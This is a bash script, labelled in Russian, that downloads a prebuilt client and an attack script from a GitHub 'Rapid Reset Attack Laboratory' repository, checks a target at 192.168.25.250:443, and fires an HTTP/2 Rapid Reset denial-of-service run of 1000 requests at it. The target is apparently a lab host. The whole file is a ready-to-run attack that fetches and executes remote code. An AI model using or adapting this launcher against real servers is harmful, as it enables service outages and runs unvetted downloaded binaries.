
#!/bin/bash
set -e
TARGET_IP="192.168.25.250"
TARGET_URL="https://${TARGET_IP}:443"
REQUESTS=1000

echo "=== [1/4] Зависимости ==="
sudo apt-get update
sudo apt-get install -y wget curl ca-certificates

echo "=== [2/4] Загрузка скриптов атаки ==="
mkdir -p ~/rapidreset && cd ~/rapidreset
wget -q -O rapidresetclient "https://github.com/Millen93/HTTP-2.0-Rapid-Reset-Attack-Laboratory/raw/main/dos_script/rapidresetclient"
wget -q -O attack.sh "https://raw.githubusercontent.com/Millen93/HTTP-2.0-Rapid-Reset-Attack-Laboratory/main/dos_script/attack.sh"
chmod +x rapidresetclient attack.sh

echo "=== [3/4] Проверка доступности цели ==="
curl -sk -o /dev/null -w "HTTP status: %{http_code}\n" "$TARGET_URL" || true

echo "=== [4/4] Запуск атаки: ${REQUESTS} запросов на ${TARGET_URL} ==="
./attack.sh -u "$TARGET_URL" -r "$REQUESTS"
